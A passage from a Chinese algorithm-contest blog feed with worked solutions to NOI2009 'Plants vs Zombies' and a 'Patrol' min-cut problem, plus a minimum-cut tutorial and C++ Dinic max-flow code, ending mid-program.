<h1 id="NOI2009植物大战僵尸"><a href="#NOI2009植物大战僵尸" class="headerlink" title="NOI2009植物大战僵尸"></a>NOI2009植物大战僵尸</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<ol>
<li>Plants vs. Zombies（PVZ）是最近十分风靡的一款小游戏。Plants（植物）和Zombies（僵尸）是游戏的主角，其中Plants防守，而Zombies进攻。该款游戏包含多种不同的挑战系列，比如Protect Your Brain、Bowling等等。其中最为经典的，莫过于玩家通过控制Plants来防守Zombies的进攻，或者相反地由玩家通过控制Zombies对Plants发起进攻。</li>
<li>现在，我们将要考虑的问题是游戏中Zombies对Plants的进攻，请注意，本题中规则与实际游戏有所不同。游戏中有两种角色，Plants和Zombies，每个Plant有一个攻击位置集合，它可以对这些位置进行保护；而Zombie进攻植物的方式是走到植物所在的位置上并将其吃掉。</li>
<li>游戏的地图可以抽象为一个N行M列的矩阵，行从上到下用0到N–1编号，列从左到右用0到M–1编号；在地图的每个位置上都放有一个Plant，为简单起见，我们把位于第r行第c列的植物记为Pr, c。</li>
<li>Plants分很多种，有攻击类、防守类和经济类等等。为了简单的描述每个Plant，定义Score和Attack如下：</li>
<li>Zombies必须从地图的右侧进入，且只能沿着水平方向进行移动。Zombies攻击植物的唯一方式就是走到该植物所在的位置并将植物吃掉。因此Zombies的进攻总是从地图的右侧开始。也就是说，对于第r行的进攻，Zombies必须首先攻击Pr, M-1；若需要对Pr, c（0≤c&lt;M-1）攻击，必须将Pr,M-1, Pr, M-2 … Pr, c+1先击溃，并移动到位置(r, c)才可进行攻击。</li>
<li>在本题的设定中，Plants的攻击力是无穷大的，一旦Zombie进入某个Plant的攻击位置，该Zombie会被瞬间消灭，而该Zombie没有时间进行任何攻击操作。因此，即便Zombie进入了一个Plant所在的位置，但该位置属于其他植物的攻击位置集合，则Zombie会被瞬间消灭而所在位置的植物则安然无恙（在我们的设定中，Plant的攻击位置不包含自身所在位置，否则你就不可能击溃它了）。</li>
<li>Zombies的目标是对Plants的阵地发起进攻并获得最大的能源收入。每一次，你可以选择一个可进攻的植物进行攻击。本题的目标为，制定一套Zombies的进攻方案，选择进攻哪些植物以及进攻的顺序，从而获得最大的能源收入。</li>
</ol>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件pvz.in的第一行包含两个整数N, M，分别表示地图的行数和列数。<br>接下来N×M行描述每个位置上植物的信息。第r×M + c + 1行按照如下格式给出植物Pr, c的信息：第一个整数为Score[Pr, c], 第二个整数为集合Attack[Pr, c]中的位置个数w，接下来w个位置信息（r’, c’），表示Pr, c可以攻击位置第r’ 行第c’ 列。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出文件pvz.out仅包含一个整数，表示可以获得的最大能源收入。注意，你也可以选择不进行任何攻击，这样能源收入为0。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题目同样是非常的麻烦，首先题目里面有很多的限制条件，也就是保护的关系，和你必须从地图的右方开始进攻，也就是说，我们需要建立一个完整的限制网络图。</p>
</li>
<li><p>首先进行读入数据，然后建立一个临时的图，将所有的有保护关系的通过一个dis[i]数组记录下来有几个植物在保护自己，然后将所有没有植物保护的放在队列里面，然后更新掉队列里面的植物所保护的其他植物，一旦这个植物所有的保护都被更新掉了（拓扑排序），那么我们就将他加入到队列里面。</p>
</li>
<li><p>进行一轮跟新之后，剩下的就是形成了一个保护环了，也就是里面的所有植物都是互相保护着的，然后我们除掉他们，也就是我们不可能干掉里面的任何一个植物了，所以就可以去掉了。一个DFS遍历将所有的环里面的植物的Del值标志位true,然后我们就可以重新建图。所有有先后关系的，先者向后者连着一条边，然后权值为正的连着汇点，权值为负的连着源点，对应边的权值全部为原来的绝对值。</p>
</li>
<li><p>然后剩下的就是一个最大权闭合图的模型了，直接套最大流的模板就好了。</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> P(x,y) (x-1)*m+y<span class="comment">//这里* 表示坐标</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">&#125;a[<span class="number">200000</span>],b[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,Queue[<span class="number">200000</span>],Level[<span class="number">200000</span>],len;</span><br><span class="line"><span class="keyword">int</span> Link_First[<span class="number">200000</span>],Maxx,dis[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,Link_Second[<span class="number">200000</span>],Energy[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> Delete[<span class="number">200000</span>],top,all,ans,tot;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Queue,<span class="number">0</span>,<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_First[Queue[head]];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">    &#123;</span><br><span class="line">        Queue[++tail]=a[i].Point;</span><br><span class="line">        Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[Maxx]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==Maxx) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,d=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_First[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(d=GetMaxFlow(a[i].Point,min(Flow-MaxFlow,a[i].Value)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=d;</span><br><span class="line">        a[i].Value-=d;</span><br><span class="line">        a[a[i].Back].Value+=d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">2123456789</span>))</span><br><span class="line">    all+=ans; <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Value=v;</span><br><span class="line">    a[len].Next=Link_First[x];</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link_First[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Value=<span class="number">0</span>;</span><br><span class="line">    a[len].Next=Link_First[y];</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link_First[y]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertEdge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dis[y]++;</span><br><span class="line">    b[++cnt].Point=y;</span><br><span class="line">    b[cnt].Next=Link_Second[x];</span><br><span class="line">    Link_Second[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Delete[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_Second[x];i;i=b[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(!Delete[b[i].Point]) DFS(b[i].Point);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TopSort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dis[i]) Queue[++top]=i;</span><br><span class="line">    <span class="keyword">else</span> Delete[i]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> That=Queue[top--];</span><br><span class="line">        Delete[That]=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_Second[That];i;i=b[i].Next)</span><br><span class="line">        &#123;</span><br><span class="line">            dis[b[i].Point]--;</span><br><span class="line">            <span class="keyword">if</span>(!dis[b[i].Point])</span><br><span class="line">            Queue[++top]=b[i].Point;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)</span><br><span class="line">    <span class="keyword">if</span>(Delete[i]) DFS(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rebuild</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)</span><br><span class="line">    <span class="keyword">if</span>(!Delete[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Energy[i]&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tot+=Energy[i];</span><br><span class="line">            AddEdge(i+<span class="number">1</span>,Maxx,Energy[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> AddEdge(<span class="number">1</span>,i+<span class="number">1</span>,-Energy[i]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Link_Second[i];j;j=b[j].Next)</span><br><span class="line">        <span class="keyword">if</span>(!Delete[b[j].Point])</span><br><span class="line">        AddEdge(i+<span class="number">1</span>,b[j].Point+<span class="number">1</span>,<span class="number">2123456789</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read();</span><br><span class="line">    Maxx=n*m+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Energy[P(i,j)]=Read();</span><br><span class="line">        <span class="keyword">int</span> Protect=Read();</span><br><span class="line">        <span class="keyword">while</span>(Protect--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> x=Read()+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> y=Read()+<span class="number">1</span>;</span><br><span class="line">            InsertEdge(P(i,j),P(x,y));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;<span class="number">1</span>;j--)</span><br><span class="line">    InsertEdge(P(i,j),P(i,j<span class="number">-1</span>));</span><br><span class="line">    TopSort(); Rebuild(); Dinic();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;tot-all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>网络流-最小割</title>
    <url>/2017/05/26/2eb2f134a2d3/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><ul>
<li>首先是最小割，这个最小割真的是非常Exciting啊，好像讲稿里面什么都没有些QAQ，真的是超级难受。然后自己百度了好久在弄明白了最小割的定义和求法（垃圾讲稿毁我青春！:angry:）</li>
</ul>
<h1 id="最小割"><a href="#最小割" class="headerlink" title="最小割"></a>最小割</h1><h2 id="最小割定义："><a href="#最小割定义：" class="headerlink" title="最小割定义："></a>最小割定义：</h2><blockquote>
<p>割：设Ci为网络N中一些弧的集合，若从N中删去Ci中的所有弧能使得从源点Vs到汇点Vt的路集为空集时，称Ci为Vs和Vt间的一个割。通俗理解，一个图或网络的割，表示一个切面或切线，将图或网络分为分别包含源点和漏点的两个子集，该切线或切面与网络相交的楞或边的集合，称为图像的割。<br><br>最小割：最小割，图中所有的割中，边权值和最小的割为最小割</p>
</blockquote>
<p><img src="https://xorex.space/image/055.png"></p>
<p>上面都是从百度百科里面粘过来的，用通俗易懂的话来说，假如你们家有一个复杂的水管路，然而你惹了 <code>JZYZ</code> 的 <code>Centry</code> 大佬，这位 <code>Centry</code> 大佬决定让你家没有水喝，一滴水都没有的那种，于是派<code>Xorex</code> 来执行任务。</p>
<p><code>Xorex</code> 为了解决这个问题，只能用键盘砸断水管，这个砸断水管使得边不连通的过程就是割。但是有些水管粗有些细，粗的需要砸的时间长，细的则短一些，<code>Xorex</code> 也知道砸水管很耗费时间，那么这个设计最短时间断掉你家水源的方案就是一个最小割（最小割方案并不唯一）</p>
<p>比方说，水管公司是源点S，你家是汇点T，那么 <code>Xorex</code> 需要割掉一些代价和最小的边使得没有任何从S到T的通路，这样你家里就断水了哈哈哈哈……:smile:</p>
<h2 id="最小割解法："><a href="#最小割解法：" class="headerlink" title="最小割解法："></a>最小割解法：</h2><blockquote>
<p>最小割的大小就是最大流的大小，我大概可以并不严谨的显然法来小小的证明一下：</p>
</blockquote>
<ul>
<li><p>首先我们可以这样想，一个图的<strong>最大流</strong>是许多条路到汇点的流的大小，正是这些通路使得源点和汇点可以相连接，那么我们将这些通路打断就好了，那么该打断这些通路的哪一段呢？因为我们求得是最小割，所以自然就是流量最小的那一段了！然后我们将所有的边权最小的打断之后这样图一定是不连通的了。</p>
</li>
<li><p>而求所有最短的边权可以利用求最大流来转化解决，在最大流的所有满流的边，都是这条通路的边权最小的边，因为如果存在更小的边权，那么上面的那条满流的边就不可能满流，流量而是边权最小的那个边的边权。</p>
</li>
<li><p>这样最大流的大小就是漫流边边权之和，也就是最小割的大小了。</p>
</li>
<li><p>那么如何来求出最小割的其中一种方案呢，我们在进行最大流计算完成之后，从原点进行遍历整张图，将遍历到的点标记为 <code>true</code> ；最终结束之后，所有标记为 <code>true</code> 的点和没有标记的点之间就是一个割边。</p>
</li>
<li><p>那么为什么求出来的就是割边呢，因为最大流之后，所有通路在满流的那条通道处断掉了，也就是没有办法继续走下去，而这条通道一边标记为了 <code>true</code> 另一边没有被标记，那么他们之间就是一个割边了。</p>
</li>
</ul>
<p>写出来真的是不容易呢QAQ</p>
<table>
<thead>
<tr>
<th>网络流</th>
<th>求法</th>
<th>建图</th>
</tr>
</thead>
<tbody><tr>
<td>最大流</td>
<td>FF或Dinic</td>
<td>拆点，乱连</td>
</tr>
<tr>
<td>最小割</td>
<td>FF或Dinic</td>
<td>拆点，乱连</td>
</tr>
</tbody></table>
<p>下面放上几道练习题吧，毕竟网络流这类题目最难得地方就是建图呢，超级不好建图，从最短路那里建立起来的自信心完全被 <del>打爆</del> 了……</p>
<h1 id="P1320-Patrol"><a href="#P1320-Patrol" class="headerlink" title="P1320 Patrol"></a>P1320 Patrol</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>   FJ有个农场，其中有n块土地，由m条边连起来。FJ的养牛场在土地1，在土地n有个新开张的雪糕店。Bessie经常偷偷溜到雪糕店，当Bessie去的时候，FJ就要跟上她。但是Bessie很聪明，她在从雪糕店返回时不会经过去雪糕店时经过的农场，因此FJ总是抓不住Bessie。<br>为了防止Bessie生病，FJ决定把一些诚实的狗放在一些土地(1和n除外)上，使Bessie无法在满足每块土地最多只经过一次的条件的情况下，从养牛场溜到雪糕店然后又溜回养牛场。<br>求出FJ最少要放多少只狗。数据保证1和n间没有直接的连边。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<ol>
<li>第一行：两个整数：n和m。<br></li>
<li>下面到M + 1：每行包含两个整数A和B是一条连接A和B的路径可以通过，沿着这两条路。没有踪迹会出现两次。</li>
</ol>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一个整数，需要放上狗的所有地方的数量。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题据说是网络流最小割的模板题，QAQ模板题都这么难，不愧是高级算法啊。</p>
<ul>
<li><p>首先还是建图，因为求最小割就是跑一遍Dinic的事，主要是能把整张图建立起来才行，这道题不同于割边的是，他是一个点隔断，那么我们可以将这个点进行拆开，拆成连个点，两个点之间连接一条权值为1的边，作为割边，也就是说，如果要割掉这个点，等价于割掉这个点和拆开的点之间的那条边，然后其他点点之间的连接权值就无所谓了，不过必须是大于零的，推荐使用1.</p>
</li>
<li><p>这里需要注意的是，源点和汇点是不需要拆开的，不然等着徐王吧……还有建立点与点之间的连接的时候，除了拆点，源点，汇点为单向边以外，其他的两块地相连的为双向边。</p>
</li>
<li><p>最后透露一个小坑，数据里面可能直接没有任何通路，也就是说你不需要放狗狗，那么就需要特判一下了。</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">&#125;a[<span class="number">80000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,Level[<span class="number">8000</span>],Link[<span class="number">8000</span>],len;</span><br><span class="line"><span class="keyword">int</span> x,y,Maxx,Queue[<span class="number">8000</span>],ans,all;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetEdge_Frist</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=c;</span><br><span class="line">    a[len].Next=Link[b];</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link[b]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetEdge_Second</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Next=Link[y];</span><br><span class="line">    a[len].Value=<span class="number">0</span>;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link[y]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetEdge_Third</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=c;</span><br><span class="line">    a[len].Next=Link[b];</span><br><span class="line">    a[len].Value=<span class="number">0</span>;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link[b]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">    &#123;</span><br><span class="line">        Queue[++tail]=a[i].Point;</span><br><span class="line">        Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[Maxx]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==Maxx) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,d=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(Level[a[i].Point]==Level[x]+<span class="number">1</span>&amp;&amp;a[i].Value)</span><br><span class="line">    <span class="keyword">if</span>(d=GetMaxFlow(a[i].Point,min(a[i].Value,Flow-MaxFlow)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=d;</span><br><span class="line">        a[i].Value-=d;</span><br><span class="line">        a[a[i].Back].Value+=d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>))</span><br><span class="line">    all+=ans; <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    Maxx=n+n<span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++) <span class="comment">//进行拆点</span></span><br><span class="line">    GetEdge_Second(i,i+n<span class="number">-2</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y) swap(x,y);</span><br><span class="line">        <span 